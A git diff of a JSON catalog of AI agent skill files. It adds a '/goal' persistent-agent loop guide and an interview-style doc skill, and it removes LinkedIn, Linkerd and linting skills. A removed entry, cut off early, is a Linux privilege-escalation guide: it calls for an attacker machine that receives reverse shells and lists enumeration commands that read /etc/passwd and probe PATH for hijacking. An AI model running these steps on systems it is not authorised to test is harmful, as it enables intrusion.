+      "content": "\n# Agent `/goal` Loop\n\n## What `/goal` is\n\n`/goal` is a slash command that turns an agent prompt into a **persistent agent** looping `plan → act → test → review → iterate` until a stop condition is met, the user pauses, or the token budget runs out. Internally called the \"Ralph loop.\"\n\nAgents with the `/goal` feature right now: **Codex, Claude Code, and Hermes Agent**.\n\nKey difference from a normal prompt: when a turn ends but the goal isn't met, the agent **auto-continues** instead of waiting for input.\n\n**Lifecycle states:** `pursuing`, `paused`, `achieved`, `unmet`, `budget-limited`.\n\nWhen monitoring a running `/goal`, every check should include a one-line update to the user: what the agent is doing and whether it is on track. Keep it extremely concise.\n\n**Not:** a budget command, a safety boundary, \"run forever\", or a replacement for `/plan`. It's a contract enforcer with a verification loop.\n\n## Requirements\n\n- An agent with the `/goal` feature — right now: Codex, Claude Code, or Hermes Agent\n- The goals feature enabled in the agent's config\n- **Subscription auth** — API-key auth does **not** work. A pro-tier plan is the realistic minimum for long runs.\n\n## When to Use it\n\nUse only when **all three** are true:\n1. Task is >30 min of mechanical work.\n2. There's a **verifiable stop condition** (tests pass, coverage hit, eval ≥ X, build green).\n3. Repo is agent-ready (working build, decent tests, `AGENTS.md` present).\n\nFits: migrations, coverage lifts, TDD feature builds, refactors with contract tests, prompt/eval optimization, deploy retry loops, bug-repro-then-fix.\n\nBad fits: exploratory work, vague \"improve this\", anything without a \"done\" definition, prod credentials, destructive shared-infra ops.\n\n## The 5-part contract (every goal needs this)\n\n1. **Objective** — one sentence, one concrete outcome.\n2. **Constraints** — what must NOT change (public API, files, libs, conventions).\n3. **Validation command** — the exact shell command that proves progress (`pytest -q`, `pnpm test`, etc.).\n4. **Stop condition** — verifiable: \"Stop when X passes\" OR \"when further changes need human/product input.\"\n5. **Documentation** — one sentence instructing the agent to write concise, targeted docs for every change, either creating new `.md` files or updating existing ones.\n\nPlus: tell the agent what to read first, ask it to work in checkpoints with a short progress log.\n\n## Writing a goal (the core deliverable)\n\nWhen the user wants a quick `/goal` instruction, produce a structured markdown block with one line per contract item (proper newlines, not flowing prose). **Do not prefix the output with `/goal`** — the user adds the slash command themselves in the composer. Emit only the contract body. Template:\n\n```\n**Objective:** <one-sentence objective>\n**Read first:** <files/PLAN.md/issue>\n**Constraints:** <what not to change, libs, conventions>\n**Validate:** `<exact command>` after each change\n**Document:** Write concise, targeted documentation for all changes — create new `.md` files or update existing docs as needed.\n**Checkpoints:** work in checkpoints and log progress briefly\n**Stop when:** <verifiable condition>, OR when further changes require human/product input\n```\n\n### Example (migration)\n\n```\n**Objective:** Migrate this project from Pydantic v1 to v2.\n**Read first:** pyproject.toml, src/, tests/\n**Constraints:** no public API changes; keep imports backwards-compatible via shims if needed; no new dependencies\n**Validate:** `pytest -q` after each change\n**Checkpoints:** work in checkpoints; log progress briefly\n**Stop when:** full suite passes with zero deprecation warnings, OR when a change requires architecture decisions\n```\n\n### Example (coverage lift)\n\n```\n**Objective:** Raise coverage in src/auth/ from ~38% to ≥75%.\n**Read first:** src/auth/, tests/auth/, AGENTS.md\n**Constraints:** no new deps; mirror existing test style; do not modify production code unless strictly required for testability\n**Validate:** `pytest --cov=src/auth --cov-report=term-missing`\n**Checkpoints:** work in checkpoints; log coverage delta each one\n**Stop when:** coverage ≥75% AND all tests pass, OR when uncovered code needs design changes\n```\n\n### Writing rules\n- **One objective, one stop condition.** Not a backlog.\n- **Documentation is mandatory.** Every `/goal` prompt must include a single sentence committing the agent to concise, targeted docs — new `.md` files or focused updates to existing docs.\n- **Never instruct the agent to create new ADRs** — ADRs require the user's explicit approval, so goal prompts must not pre-approve or encourage them.\n- **Forbid reward-hacking explicitly:** \"Do not delete, skip, weaken, or narrow tests to make the goal pass.\" Otherwise the agent may game the stop condition.\n- **4,000-char limit** on the objective. If longer, put detail in a file (`PLAN.md`/`GOAL_BRIEF.md`) and make the goal point to it — keep the goal itself compact.\n- Use **literal strings** for paths, commands, issue numbers — exact.\n- For",
+      "tags": [
+        "markdown",
+        "api",
+        "claude",
+        "ai",
+        "agent",
+        "gpt",
+        "automation",
+        "workflow",
+        "template",
+        "design"
+      ],
+      "useCases": [],
+      "scrapedAt": "2026-07-07T09:57:23.290Z"
     },
     {
       "id": "antigravity-godot-4-migration",
@@ -23942,6 +24314,32 @@
       "scrapedAt": "2026-03-13T07:07:47.421Z"
     },
     {
+      "id": "antigravity-interview-style-doc-building",
+      "name": "interview-style-doc-building",
+      "slug": "interview-style-doc-building",
+      "description": "Build structured strategy documents by asking one question at a time and patching the file.",
+      "category": "Document Processing",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/interview-style-doc-building",
+      "content": "\n# Interview-Style Doc Building\n\nThe user's preferred mode for creating durable strategic docs. AI does NOT propose content — AI asks one question, the user answers, AI patches the file, AI asks the next question. The file IS the conversation's output, updated incrementally.\n\n## When to Use\n\n- Building a new SSOT file (life priorities, life vision, principles, frameworks, ranked lists).\n- Filling out a structured doc the user explicitly wants to author themselves.\n- Quarterly/annual reviews where the user's words go into the file.\n\n**NOT for:** day planning (use `day-plan`), task triage (`organize-tasks`), or anything where AI proposes content first.\n\n## The Loop\n\n1. **Create the file** with a skeleton (header, sections, \"to be filled in\" placeholders). Single `write_file` for the new file. After this, NEVER overwrite — only `patch`.\n2. **Ask ONE question.** Concise. Specific. Single-faceted. Open-ended where possible.\n3. **Wait for the answer.** Don't ask the next question yet.\n4. **Patch the file** with the user's answer in the correct section.\n5. **Re-ask** — next question, or follow-up if the answer was incomplete.\n6. Repeat until the file is complete.\n\n## Hard Rules\n\n- **One question at a time.** Never dump multiple questions in a single message. The user has flagged this.\n- **Patch, don't overwrite.** After the initial skeleton, use `patch` for every update. Never `write_file` to an existing doc.\n- **Update the file BEFORE asking the next question.** Order: receive answer → patch file → ask next question. Not the reverse.\n- **Lists from the user are UNORDERED SETS.** When the user lists items in response to \"which X should we cover?\" or \"what are the Ys?\", that is a SET, not a ranking. Never infer rank, priority, or sequence from the order they typed them. If you need ordering, ask explicitly: \"Which of these is #1?\"\n- **Ask dynamics, not names.** When the user references a person, don't ask \"who is X?\" — ask about the role/dynamic.\n- **No snark, no attitude, no filler.** Concise questions, concise acknowledgments.\n- **No speculative additions.** Don't invent sections, edge cases, or \"anything else?\" prompts unless the user asks.\n\n## Question Design\n\n- **Domain-discovery, not confirmation.** \"What wins against everything else?\" — not \"Is Business #1?\"\n- **Surface new reality.** Each question should pull out info AI doesn't already have.\n- **Engine-move framing where applicable.** \"What's the thing that, if true, makes the rest obvious?\"\n- **Concrete over abstract.** \"What's #2 — the domain that wins against everything except #1?\" beats \"Tell me about your second priority.\"\n\n## File Patching Pattern\n\nAfter each answer:\n1. Read the relevant section (if not already in context).\n2. `patch` with `old_string` = placeholder or previous entry, `new_string` = updated content with the user's words preserved.\n3. Confirm the diff. Move on.\n\nFor ranked lists, append one rank at a time:\n```\n1. **Business** — Q2 #1 goal: ...\n2. **Health** — get below 81.0 kg, sleep 9h/day, ...\n```\nEach rank gets patched in as the user confirms it.\n\n## Common Pitfalls\n\n- **Assuming order from a set.** The user lists \"A, B, C, D\" → AI writes \"1. A, 2. B, 3. C, 4. D\" → the user flags it. ALWAYS confirm rank explicitly.\n- **Asking too many questions at once.** Even bundling 2 violates the rule.\n- **Overwriting the file** instead of patching specific sections — destroys prior content.\n- **Adding AI-generated content** to fill out sections. Sections stay empty until the user provides the content.\n- **Skipping the file update** between Q&A pairs — the doc falls out of sync.\n\n## Pairing with Other Skills\n\n- `day-plan` — different pattern (task triage), not interview-style.\n- `organize-tasks` — Todoist-specific.\n- `memory-management` — separate from this; persona/preferences go to memory.\n\n## Limitations\n\n- Adapted from `davidondrej/skills`; verify local paths, tools, credentials, and agent features before acting.\n- For commands, remote access, scheduling, browser automation, or file-changing workflows, get explicit user approval and confirm the target environment first.\n",
+      "tags": [
+        "claude",
+        "ai",
+        "agent",
+        "automation",
+        "workflow",
+        "design",
+        "document"
+      ],
+      "useCases": [
+        "Building a new SSOT file (life priorities, life vision, principles, frameworks, ranked lists).",
+        "Filling out a structured doc the user explicitly wants to author themselves.",
+        "Quarterly/annual reviews where the user's words go into the file."
+      ],
+      "scrapedAt": "2026-07-07T09:58:09.889Z"
+    },
+    {
       "id": "antigravity-invariant-guard",
       "name": "invariant-guard",
       "slug": "invariant-guard",
@@ -25842,374 +26240,6 @@
       "scrapedAt": "2026-02-26T07:12:18.165Z"
     },
     {
-      "id": "antigravity-linkedin-content-generator",
-      "name": "linkedin-content-generator",
-      "slug": "linkedin-content-generator",
-      "description": "AI-powered LinkedIn content suite: generate posts, carousels, newsletters, and 30-day calendars with niche-specific SEO rules and a reinforcement-learning personal memory system.",
-      "category": "Document Processing",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/linkedin-content-generator",
-      "content": "\n# LinkedIn Content Generator\n\n## Overview\n\nA full LinkedIn content-creation suite for Claude Code that turns a topic and niche into\npublish-ready posts, multi-slide carousels, long-form newsletter editions, and 30-day content\ncalendars — all wired through a personal reinforcement-learning memory system so every output\nimproves as you give feedback.\n\nSeven coordinated commands cover the full content workflow:\n\n| Command | Purpose |\n|---|---|\n| `/generate-post` | Single ready-to-publish LinkedIn post |\n| `/generate-carousel` | Numbered slide content + caption |\n| `/generate-newsletter` | Long-form newsletter edition |\n| `/generate-calendar` | 30-day posting calendar with Markdown table |\n| `/show-memory` | Display current preferences and feedback log |\n| `/feedback` | Save what worked for future outputs |\n| `/clear-memory` | Reset memory to factory defaults |\n\nAll helper scripts are bundled inside `skills/linkedin-content-generator/scripts/` and ship\nalongside this `SKILL.md`. They build richly engineered prompts, inject your saved\npreferences, and enforce LinkedIn SEO rules before Claude generates output.\nA local `memory.md` file persists your style, tone, successful hooks, and top-performing\nformats across every session.\n\n## When to Use This Skill\n\n- Use when you need a ready-to-paste LinkedIn post with SEO-optimised hooks and hashtags.\n- Use when building a multi-slide carousel deck for LinkedIn Documents.\n- Use when writing a long-form LinkedIn Newsletter edition with structured sections.\n- Use when planning an entire month of content with format variety and pacing rules.\n- Use when you want content that adapts to your personal voice over time via saved feedback.\n- Use when working in any niche (AI, SaaS, Marketing, Finance, Healthcare, etc.) and need\n  platform-native formatting that avoids common LinkedIn algorithmic pitfalls.\n\n## Prerequisites\n\n**Python 3.8 or later** must be available in your shell path.\n\nThe skill is self-contained. Install it from the antigravity skills library:\n\n```bash\n# Install via antigravity CLI (recommended)\nantigravity install linkedin-content-generator\n\n# Or copy manually into your Claude Code skills directory\ncp -r skills/linkedin-content-generator ~/.claude/skills/\n```\n\nAll six Python scripts and the default `memory.md` are bundled inside the\n`scripts/` subdirectory of this skill. No additional cloning or downloads are required.\nNo API keys, external services, or network access are needed.\n\n## How It Works\n\n### Architecture\n\n```\nUser command (/generate-post ...)\n        │\n        ▼\nSKILL.md parses $ARGUMENTS\n        │\n        ▼\nPython script builds prompt\n  • Injects LinkedIn SEO rules\n  • Injects memory.md preferences\n        │\n        ▼\nClaude generates publish-ready output\n        │\n        ▼\n/feedback saves what worked → memory.md\n        (loop — every future output improves)\n```\n\n### Step 1: Set Up Your Niche (One-Time)\n\nOpen `~/.claude/skills/linkedin-content-generator/scripts/memory.md` and update the\n**Primary Niche** field:\n\n```markdown\n## Core Identity & Tone\n- **Primary Niche:** AI & Technology   ← change this\n```\n\nThis field is injected into every prompt. Without it, the skill defaults to\n`\"AI & Technology\"`.\n\n### Step 2: Generate Content\n\nRun any of the seven commands described in the **Commands Reference** section below.\nClaude reads the script output and produces the final content directly in the chat.\n\n### Step 3: Save What Works\n\nAfter each output, save successful patterns with `/feedback`:\n\n```\n/feedback the storytelling hook in this post got 3x more comments than usual\n```\n\nThe feedback is appended to `memory.md` and automatically injected into all future\ngeneration prompts.\n\n## Commands Reference\n\n### `/generate-post` — Single LinkedIn Post\n\nGenerates a scroll-stopping, SEO-optimised LinkedIn text post.\n\n**Usage:**\n```\n/generate-post <topic> [in <niche>] [tone: controversial|storytelling|educational|motivational|professional]\n```\n\n**Parameters:**\n\n| Parameter | Default | Options |\n|---|---|---|\n| `topic` | required | any subject |\n| `niche` | `\"AI & Technology\"` | any industry |\n| `tone` | `professional` | `professional` · `storytelling` · `controversial` · `educational` · `motivational` |\n| `style` | `list-based` | `list-based` · `text-only` · `storytelling` · `data-driven` · `contrarian` |\n\n**Examples:**\n\n```\n/generate-post why most developers fail at time management in Software Engineering tone: storytelling\n```\n\n```\n/generate-post the real cost of technical debt in SaaS tone: controversial\n```\n\n```\n/generate-post 5 things I wish I knew before my first startup in Entrepreneurship tone: educational style: list-based\n```\n\n**Output structure:**\n1. Scroll-stopping hook (2 lines, triggers \"see more\")\n2. Context / problem setup (2–3 short sentences)\n3. Core value (numbered list or bullets, max 7 items)\n4. Key takeaway (1–2 punchy sentences)\n5. Specific call to action\n6. 3–5 hashtags (broad + niche + community mix)\n\n---\n\n### `/generate-carousel` — LinkedIn",
-      "tags": [
-        "python",
-        "markdown",
-        "api",
-        "mcp",
-        "claude",
-        "ai",
-        "agent",
-        "automation",
-        "workflow",
-        "template"
-      ],
-      "useCases": [
-        "Use when you need a ready-to-paste LinkedIn post with SEO-optimised hooks and hashtags.",
-        "Use when building a multi-slide carousel deck for LinkedIn Documents.",
-        "Use when writing a long-form LinkedIn Newsletter edition with structured sections.",
-        "Use when planning an entire month of content with format variety and pacing rules.",
-        "Use when you want content that adapts to your personal voice over time via saved feedback."
-      ],
-      "scrapedAt": "2026-06-06T08:44:19.947Z"
-    },
-    {
-      "id": "antigravity-linkedin-profile-optimizer",
-      "name": "linkedin-profile-optimizer",
-      "slug": "linkedin-profile-optimizer",
-      "description": "High-intent expert for LinkedIn profile checks, authority building, and SEO optimization. Invoke to audit, rewrite, and enhance profiles for top 1% positioning.",
-      "category": "Creative & Media",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/linkedin-profile-optimizer",
-      "content": "\n# LinkedIn Profile Optimizer & Authority Builder\n\n## Overview\n\nAct as a **global LinkedIn strategist, profile optimizer, and career coach**. Your goal is to perform deep **profile checks and optimizations**, transforming local \"CV-style\" lists into international authority profiles that rank in the top 1% of their niche.\n\nThis skill helps professionals (founders, lecturers, IT experts, and agritech builders) align their core identity, remove brand confusion, and attract global opportunities by synthesizing information from multiple sources like portfolios, CVs, and existing profile links.\n\n## When to Use This Skill\n\n- Use when a user needs to optimize their **LinkedIn Profile** (Headline, About, Experience).\n- Use when a user needs a **Personal Brand Audit** or \"roast\" to identify weak credibility or generic wording.\n- Use when a user wants to **Rewrite Experience** sections with measurable impact and global standards.\n- Use when a user needs a **Content & Growth Strategy** to build authority and visibility.\n- Use when the user provides a **Portfolio Link** or **CV PDF** to enhance their professional presence.\n\n## Input Types\n\nThis skill accepts and can process:\n- **LinkedIn Profile Links / Usernames**: Analyzing public profile data and positioning from full URLs or unique handles (e.g., `whoisabhishekadhikari`).\n- **CV / Resume (PDF/Text/Hosted)**: Converting traditional or hosted resumes into authority-driven LinkedIn profiles.\n- **Portfolio Links**: Extracting projects, visual proof, and technical skills from personal websites, GitHub, or Behance.\n- **Multiple Sources**: Synthesizing information from one or more links (e.g., LinkedIn + Portfolio + CV).\n- **Profile Content**: Enhancing existing \"About\" sections, headlines, or experience descriptions.\n\n## How It Works\n\n### Phase 0: Input Analysis & Enhancement\n\nBefore proceeding to context gathering, analyze the provided input:\n- **If a LinkedIn Link or Username is provided**: Identify current headline and positioning.\n    - **Hallucination Prevention**: If only a username/handle is provided, you **MUST** verify you can access the profile using your browsing tool. If the profile is private, inaccessible, or your browsing tool is disabled, you must ask the user to provide the profile text or a full URL before proceeding with the audit.\n- **If a CV (PDF/Hosted) is provided**: Extract key roles, measurable achievements, and core skills.\n- **If a Portfolio Link is provided**: Identify core projects, technical stacks, and visual/creative authority.\n- **If Multiple Sources are provided**: Cross-reference data to ensure consistency and highlight the \"Red Thread.\"\n\n### Phase 1: Context & Identity Gathering\n\nBefore optimizing, you must identify the user's **Core Identity**.\nIf the user has multiple roles (e.g., Founder + Lecturer + IT Professional), you must determine the primary focus to avoid \"brand confusion.\"\n\n**Ask the user:**\n1. What is your primary career goal or \"Mission\"?\n2. Who is your target audience (Recruiters, Investors, Clients, Students)?\n3. What is your primary niche or industry focus (e.g., Agritech, IT Infrastructure)?\n\n### Phase 2: Profile Audit & \"Roast\"\n\nCritically evaluate the existing profile like a global recruiter, high-level investor, or potential high-ticket client.\n\n**Identify and point out:**\n- **Weak Credibility & Social Proof**: Lack of measurable results, generic praise in recommendations, or zero recent activity.\n- **Generic Wording**: Words like \"passionate,\" \"hardworking,\" or \"expert\" without verifiable evidence.\n- **Brand Confusion (Anchor Identity)**: Mixing too many unrelated roles (e.g., \"DJ & Software Engineer\") without a unifying narrative.\n- **Education/Experience Gaps**: Unexplained transitions or skills that don't match the reported experience levels.\n- **Conversion Drain (CTA Audit)**: Identifying profiles that fail to tell the visitor what to do next (e.g., no link in top card, no clear \"Work with me\" in About).\n- **Visual Brand Inconsistency**: Profile/Banner images that are low-quality, outdated, or don't align with the professional level claimed.\n- **Mobile Readability Check**: Headlines that cut off on mobile or paragraphs in \"About\" that are too dense for small screens.\n- **SEO & Searchability**: Identifying missing industry keywords in the Headline and About sections.\n- **Contact Info & Hygiene**: Identifying inactive emails, old website links, or missing contact methods.\n\n### Phase 3: Profile Optimization\n\n#### 1. Headline & About Section\n- **Headline**: Move from \"Job Title at Company\" → \"Authority Statement + Value Proposition + Keywords.\"\n- **About**: Write a compelling narrative (hook, problem-solving, proof, call-to-action). \n    - **SEO Intent Check**: Ensure primary keywords are in the first 2-3 lines.\n    - **Authenticity**: Avoid the \"third person\" style; keep it human and action-oriented.\n\n#### 2. Featured Section (Portfolio & Proof)\n- **Mandatory Call-to-Action**: Instruct the user to add their best w",
-      "tags": [
-        "pdf",
-        "claude",
-        "ai",
-        "agent",
-        "gpt",
-        "workflow",
-        "design",
-        "image",
-        "rag",
-        "seo"
-      ],
-      "useCases": [
-        "Use when a user needs to optimize their **LinkedIn Profile** (Headline, About, Experience).",
-        "Use when a user needs a **Personal Brand Audit** or \"roast\" to identify weak credibility or generic wording.",
-        "Use when a user wants to **Rewrite Experience** sections with measurable impact and global standards.",
-        "Use when a user needs a **Content & Growth Strategy** to build authority and visibility.",
-        "Use when the user provides a **Portfolio Link** or **CV PDF** to enhance their professional presence."
-      ],
-      "scrapedAt": "2026-04-14T08:01:15.185Z"
-    },
-    {
-      "id": "antigravity-linkerd-patterns",
-      "name": "linkerd-patterns",
-      "slug": "linkerd-patterns",
-      "description": "Production patterns for Linkerd service mesh - the lightweight, security-first service mesh for Kubernetes.",
-      "category": "Document Processing",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/linkerd-patterns",
-      "content": "\n# Linkerd Patterns\n\nProduction patterns for Linkerd service mesh - the lightweight, security-first service mesh for Kubernetes.\n\n## Do not use this skill when\n\n- The task is unrelated to linkerd patterns\n- You need a different domain or tool outside this scope\n\n## Instructions\n\n- Clarify goals, constraints, and required inputs.\n- Apply relevant best practices and validate outcomes.\n- Provide actionable steps and verification.\n- If detailed examples are required, open `resources/implementation-playbook.md`.\n\n## Use this skill when\n\n- Setting up a lightweight service mesh\n- Implementing automatic mTLS\n- Configuring traffic splits for canary deployments\n- Setting up service profiles for per-route metrics\n- Implementing retries and timeouts\n- Multi-cluster service mesh\n\n## Core Concepts\n\n### 1. Linkerd Architecture\n\n```\n┌─────────────────────────────────────────────┐\n│                Control Plane                 │\n│  ┌─────────┐ ┌──────────┐ ┌──────────────┐ │\n│  │ destiny │ │ identity │ │ proxy-inject │ │\n│  └─────────┘ └──────────┘ └──────────────┘ │\n└─────────────────────────────────────────────┘\n                      │\n┌─────────────────────────────────────────────┐\n│                 Data Plane                   │\n│  ┌─────┐    ┌─────┐    ┌─────┐             │\n│  │proxy│────│proxy│────│proxy│             │\n│  └─────┘    └─────┘    └─────┘             │\n│     │           │           │               │\n│  ┌──┴──┐    ┌──┴──┐    ┌──┴──┐            │\n│  │ app │    │ app │    │ app │            │\n│  └─────┘    └─────┘    └─────┘            │\n└─────────────────────────────────────────────┘\n```\n\n### 2. Key Resources\n\n| Resource | Purpose |\n|----------|---------|\n| **ServiceProfile** | Per-route metrics, retries, timeouts |\n| **TrafficSplit** | Canary deployments, A/B testing |\n| **Server** | Define server-side policies |\n| **ServerAuthorization** | Access control policies |\n\n## Templates\n\n### Template 1: Mesh Installation\n\n```bash\n# Install CLI\nbrew install linkerd\n\n# Alternative: download the official installer, inspect it, then execute it\ntmpdir=\"$(mktemp -d)\"\ntrap 'rm -rf \"$tmpdir\"' EXIT\ncurl --proto '=https' --tlsv1.2 -sSfL https://run.linkerd.io/install -o \"$tmpdir/linkerd-install.sh\"\ncat \"$tmpdir/linkerd-install.sh\"  # review the full installer before executing\nsh \"$tmpdir/linkerd-install.sh\"\n\n# Validate cluster\nlinkerd check --pre\n\n# Install CRDs\nlinkerd install --crds | kubectl apply -f -\n\n# Install control plane\nlinkerd install | kubectl apply -f -\n\n# Verify installation\nlinkerd check\n\n# Install viz extension (optional)\nlinkerd viz install | kubectl apply -f -\n```\n\n### Template 2: Inject Namespace\n\n```yaml\n# Automatic injection for namespace\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: my-app\n  annotations:\n    linkerd.io/inject: enabled\n---\n# Or inject specific deployment\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: my-app\n  annotations:\n    linkerd.io/inject: enabled\nspec:\n  template:\n    metadata:\n      annotations:\n        linkerd.io/inject: enabled\n```\n\n### Template 3: Service Profile with Retries\n\n```yaml\napiVersion: linkerd.io/v1alpha2\nkind: ServiceProfile\nmetadata:\n  name: my-service.my-namespace.svc.cluster.local\n  namespace: my-namespace\nspec:\n  routes:\n    - name: GET /api/users\n      condition:\n        method: GET\n        pathRegex: /api/users\n      responseClasses:\n        - condition:\n            status:\n              min: 500\n              max: 599\n          isFailure: true\n      isRetryable: true\n    - name: POST /api/users\n      condition:\n        method: POST\n        pathRegex: /api/users\n      # POST not retryable by default\n      isRetryable: false\n    - name: GET /api/users/{id}\n      condition:\n        method: GET\n        pathRegex: /api/users/[^/]+\n      timeout: 5s\n      isRetryable: true\n  retryBudget:\n    retryRatio: 0.2\n    minRetriesPerSecond: 10\n    ttl: 10s\n```\n\n### Template 4: Traffic Split (Canary)\n\n```yaml\napiVersion: split.smi-spec.io/v1alpha1\nkind: TrafficSplit\nmetadata:\n  name: my-service-canary\n  namespace: my-namespace\nspec:\n  service: my-service\n  backends:\n    - service: my-service-stable\n      weight: 900m  # 90%\n    - service: my-service-canary\n      weight: 100m  # 10%\n```\n\n### Template 5: Server Authorization Policy\n\n```yaml\n# Define the server\napiVersion: policy.linkerd.io/v1beta1\nkind: Server\nmetadata:\n  name: my-service-http\n  namespace: my-namespace\nspec:\n  podSelector:\n    matchLabels:\n      app: my-service\n  port: http\n  proxyProtocol: HTTP/1\n---\n# Allow traffic from specific clients\napiVersion: policy.linkerd.io/v1beta1\nkind: ServerAuthorization\nmetadata:\n  name: allow-frontend\n  namespace: my-namespace\nspec:\n  server:\n    name: my-service-http\n  client:\n    meshTLS:\n      serviceAccounts:\n        - name: frontend\n          namespace: my-namespace\n---\n# Allow unauthenticated traffic (e.g., from ingress)\napiVersion: policy.linkerd.io/v1beta1\nkind: ServerAuthorization\nmetadata:\n  name: allow-ingress\n  namespace: my-namespace\nspec:\n  server:\n  ",
-      "tags": [
-        "api",
-        "ai",
-        "template",
-        "document",
-        "security",
-        "kubernetes",
-        "cro"
-      ],
-      "useCases": [],
-      "scrapedAt": "2026-01-29T06:59:30.316Z"
-    },
-    {
-      "id": "antigravity-lint-and-validate",
-      "name": "lint-and-validate",
-      "slug": "lint-and-validate",
-      "description": "MANDATORY: Run appropriate validation tools after EVERY code change. Do not finish a task until the code is error-free.",
-      "category": "AI & Agents",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/lint-and-validate",
-      "content": "\n# Lint and Validate Skill\n\n> **MANDATORY:** Run appropriate validation tools after EVERY code change. Do not finish a task until the code is error-free.\n\n### Procedures by Ecosystem\n\n#### Node.js / TypeScript\n1. **Lint/Fix:** `npm run lint` or `npx eslint \"path\" --fix`\n2. **Types:** `npx tsc --noEmit`\n3. **Security:** `npm audit --audit-level=high`\n\n#### Python\n1. **Linter (Ruff):** `ruff check \"path\" --fix` (Fast & Modern)\n2. **Security (Bandit):** `bandit -r \"path\" -ll`\n3. **Types (MyPy):** `mypy \"path\"`\n\n## The Quality Loop\n1. **Write/Edit Code**\n2. **Run Audit** for the project's ecosystem:\n   - **Node.js / TypeScript:** `npm run lint && npx tsc --noEmit`\n   - **Python:** `ruff check . --fix && mypy . && bandit -r . -ll`\n3. **Analyze Report:** Check the \"FINAL AUDIT REPORT\" section.\n4. **Fix & Repeat:** Submitting code with \"FINAL AUDIT\" failures is NOT allowed.\n\n## Error Handling\n- If `lint` fails: Fix the style or syntax issues immediately.\n- If `tsc` fails: Correct type mismatches before proceeding.\n- If no tool is configured: Check the project root for `.eslintrc`, `tsconfig.json`, `pyproject.toml` and suggest creating one.\n\n---\n**Strict Rule:** No code should be committed or reported as \"done\" without passing these checks.\n\n---\n\n## Scripts\n\n| Script | Purpose | Command |\n|--------|---------|---------|\n| `scripts/lint_runner.py` | Unified lint check | `python scripts/lint_runner.py <project_path>` |\n| `scripts/type_coverage.py` | Type coverage analysis | `python scripts/type_coverage.py <project_path>` |\n\n## When to Use\nThis skill is applicable to execute the workflow or actions described in the overview.\n\n## Limitations\n- Use this skill only when the task clearly matches the scope described above.\n- Do not treat the output as a substitute for environment-specific validation, testing, or expert review.\n- Stop and ask for clarification if required inputs, permissions, safety boundaries, or success criteria are missing.\n",
-      "tags": [
-        "python",
-        "typescript",
-        "node",
-        "ai",
-        "workflow",
-        "security",
-        "rag"
-      ],
-      "useCases": [],
-      "scrapedAt": "2026-01-26T13:19:15.387Z"
-    },
-    {
-      "id": "antigravity-linux-privilege-escalation",
-      "name": "linux-privilege-escalation",
-      "slug": "linux-privilege-escalation",
-      "description": "Execute systematic privilege escalation assessments on Linux systems to identify and exploit misconfigurations, vulnerable services, and security weaknesses that allow elevation from low-privilege user access to root-level control.",
-      "category": "Security & Systems",
-      "source": "antigravity",
-      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
-      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/linux-privilege-escalation",
-      "content": "\n> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.\n\n# Linux Privilege Escalation\n\n## Purpose\n\nExecute systematic privilege escalation assessments on Linux systems to identify and exploit misconfigurations, vulnerable services, and security weaknesses that allow elevation from low-privilege user access to root-level control. This skill enables comprehensive enumeration and exploitation of kernel vulnerabilities, sudo misconfigurations, SUID binaries, cron jobs, capabilities, PATH hijacking, and NFS weaknesses.\n\n## Inputs / Prerequisites\n\n### Required Access\n- Low-privilege shell access to target Linux system\n- Ability to execute commands (interactive or semi-interactive shell)\n- Network access for reverse shell connections (if needed)\n- Attacker machine for payload hosting and receiving shells\n\n### Technical Requirements\n- Understanding of Linux filesystem permissions and ownership\n- Familiarity with common Linux utilities and scripting\n- Knowledge of kernel versions and associated vulnerabilities\n- Basic understanding of compilation (gcc) for custom exploits\n\n### Recommended Tools\n- LinPEAS, LinEnum, or Linux Smart Enumeration scripts\n- Linux Exploit Suggester (LES)\n- GTFOBins reference for binary exploitation\n- John the Ripper or Hashcat for password cracking\n- Netcat or similar for reverse shells\n\n## Outputs / Deliverables\n\n### Primary Outputs\n- Root shell access on target system\n- Privilege escalation path documentation\n- System enumeration findings report\n- Recommendations for remediation\n\n### Evidence Artifacts\n- Screenshots of successful privilege escalation\n- Command output logs demonstrating root access\n- Identified vulnerability details\n- Exploited configuration files\n\n## Core Workflow\n\n### Phase 1: System Enumeration\n\n#### Basic System Information\nGather fundamental system details for vulnerability research:\n\n```bash\n# Hostname and system role\nhostname\n\n# Kernel version and architecture\nuname -a\n\n# Detailed kernel information\ncat /proc/version\n\n# Operating system details\ncat /etc/issue\ncat /etc/*-release\n\n# Architecture\narch\n```\n\n#### User and Permission Enumeration\n\n```bash\n# Current user context\nwhoami\nid\n\n# Users with login shells\ncat /etc/passwd | grep -v nologin | grep -v false\n\n# Users with home directories\ncat /etc/passwd | grep home\n\n# Group memberships\ngroups\n\n# Other logged-in users\nw\nwho\n```\n\n#### Network Information\n\n```bash\n# Network interfaces\nifconfig\nip addr\n\n# Routing table\nip route\n\n# Active connections\nnetstat -antup\nss -tulpn\n\n# Listening services\nnetstat -l\n```\n\n#### Process and Service Enumeration\n\n```bash\n# All running processes\nps aux\nps -ef\n\n# Process tree view\nps axjf\n\n# Services running as root\nps aux | grep root\n```\n\n#### Environment Variables\n\n```bash\n# Full environment\nenv\n\n# PATH variable (for hijacking)\necho $PATH\n```\n\n### Phase 2: Automated Enumeration\n\nDeploy automated scripts for comprehensive enumeration:\n\n```bash\n# LinPEAS: download first, inspect the script, then execute only in an authorized lab\ncurl -L -o linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\nless linpeas.sh\nchmod +x 